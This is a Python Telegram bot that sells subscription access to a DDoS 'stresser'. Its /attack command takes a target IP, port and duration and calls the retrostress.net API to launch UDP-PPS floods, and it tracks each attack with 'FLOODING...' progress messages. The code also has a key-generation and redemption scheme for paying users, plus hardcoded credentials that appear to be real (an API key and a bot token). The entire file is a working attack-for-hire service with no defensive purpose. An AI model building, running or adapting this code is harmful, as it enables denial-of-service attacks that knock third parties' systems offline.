import logging
import httpx
import json
import secrets
import asyncio
from datetime import datetime, timedelta
from tinydb import TinyDB, Query
from telegram import Update, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, ContextTypes

# --- CONFIGURATION ---
API_KEY = "97bcf19a5787760e859ecb94ae23ca5db04d167f7272492e657516db1d145b54"
BOT_TOKEN = "8631779524:AAERZnVqnpEW2MUyN3cvG_kF58cFJ9eOsew"
ADMIN_ID = 8787952549 

# Database Setup
db = TinyDB('sastadev_users.json')
User = Query()
Keys = TinyDB('sastadev_keys.json')
KeyQ = Query()

# --- UTILS ---
def is_subscribed(user_id):
    if user_id == ADMIN_ID: return True
    user = db.get(User.id == user_id)
    if user:
        expiry = datetime.strptime(user['expiry'], '%Y-%m-%d %H:%M:%S')
        return datetime.now() < expiry
    return False

def get_progress_bar(percentage):
    blocks = int(percentage / 10)
    return "▬" * blocks + "▭" * (10 - blocks)

# --- API FUNCTIONS ---
async def launch_attack_api(target, port, duration):
    async with httpx.AsyncClient() as client:
        url = "https://retrostress.net/api/v1/tests"
        headers = {"Authorization": f"Bearer {API_KEY}", "Content-Type": "application/json"}
        payload = {"target": target, "port": int(port), "duration": int(duration), "method": "UDP-PPS"}
        try:
            r = await client.post(url, headers=headers, json=payload, timeout=20)
            return r.json()
        except: return {"success": False, "message": "API connection failed."}

async def stop_attack_api(test_id):
    async with httpx.AsyncClient() as client:
        url = f"https://retrostress.net/api/v1/tests/{test_id}"
        headers = {"Authorization": f"Bearer {API_KEY}"}
        try:
            r = await client.delete(url, headers=headers)
            return r.json()
        except: return {"success": False}

# --- BACKGROUND ATTACK TASK ---
async def attack_progress_task(context, chat_id, message_id, target, port, duration, test_id):
    total_time = duration
    remaining = duration
    
    while remaining > 0:
        percent = int(((total_time - remaining) / total_time) * 100)
        bar = get_progress_bar(percent)
        
        text = (
            f"🚀 **ATTACK IN PROGRESS** 🚀\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 **Target:** `{target}:{port}`\n"
            f"🆔 **ID:** `{test_id}`\n"
            f"⏳ **Remaining:** `{remaining}s`\n"
            f"📊 **Progress:** `{bar} {percent}%`\n"
            f"🛑 **Stop:** `/stop {test_id}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔥 **Status:** `FLOODING...`"
        )
        
        try:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode='Markdown')
        except: pass 
        
        wait_time = min(10, remaining)
        await asyncio.sleep(wait_time)
        remaining -= wait_time

    await context.bot.send_message(chat_id=chat_id, text=f"✅ **Attack Finished!**\nTarget: `{target}:{port}`\nID: `{test_id}`")

# --- COMMAND HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "💠 **SASTA DEVELOPER VIP** 💠\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🚀 /attack - Start Stresser\n"
        "🛑 /stop - Stop Attack ID\n"
        "🔑 /redeem - Use Access Key\n"
        "👤 /myinfo - Check Status\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "✨ *High Performance & No Buttons*"
    )
    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=ReplyKeyboardRemove())

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_subscribed(user_id):
        return await update.message.reply_text("🚫 **Buy Access:** @SastaDeveloper")

    if len(context.args) < 3:
        return await update.message.reply_text("🚀 Usage: `/attack <IP> <PORT> <TIME>`")

    target, port, duration = context.args[0], context.args[1], int(context.args[2])
    if duration > 300: return await update.message.reply_text("⚠️ Max 300s allowed.")

    initial_msg = await update.message.reply_text("⚡ **REQUESTING API...**")
    res = await launch_attack_api(target, port, duration)
    
    if res.get("success"):
        test_id = res['data']['id']
        asyncio.create_task(attack_progress_task(context, update.effective_chat.id, initial_msg.message_id, target, port, duration, test_id))
    else:
        await initial_msg.edit_text(f"❌ **API Error:** `{res.get('message')}`")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_subscribed(update.effective_user.id): return
    if not context.args: return await update.message.reply_text("❌ `/stop <ID>`")
    
    test_id = context.args[0]
    res = await stop_attack_api(test_id)
    if res.get("success"):
        await update.message.reply_text(f"🛑 **Attack {test_id} Terminated!**")
    else:
        await update.message.reply_text(f"❌ **Failed to stop ID:** `{test_id}`")

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        unit, value = context.args[0], int(context.args[1])
        new_key = f"SD-{secrets.token_hex(3).upper()}"
        Keys.insert({'key': new_key, 'unit': unit, 'value': value})
        await update.message.reply_text(f"🔑 **Key:** `{new_key}`\n⏳ **Time:** {value} {unit}")
    except:
        await update.message.reply_text("❌ `/genkey hours 2` or `/genkey days 1`")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("❌ `/redeem <KEY>`")
    key_val = context.args[0]
    found = Keys.get(KeyQ.key == key_val)
    if found:
        duration = timedelta(hours=found['value']) if found['unit'] == 'hours' else timedelta(days=found['value'])
        expiry = (datetime.now() + duration).strftime('%Y-%m-%d %H:%M:%S')
        db.upsert({'id': update.effective_user.id, 'expiry': expiry}, User.id == update.effective_user.id)
        Keys.remove(KeyQ.key == key_val)
        await update.message.reply_text(f"✅ **Success!** New Expiry: `{expiry}`")
    else:
        await update.message.reply_text("❌ Invalid Key.")

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = db.get(User.id == update.effective_user.id)
    exp = user['expiry'] if user else ("LIFETIME" if update.effective_user.id == ADMIN_ID else "NONE")
    await update.message.reply_text(f"👤 **USER INFO:**\n🆔 ID: `{update.effective_user.id}`\n⏳ EXP: `{exp}`")

if __name__ == "__main__":
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.run_polling()
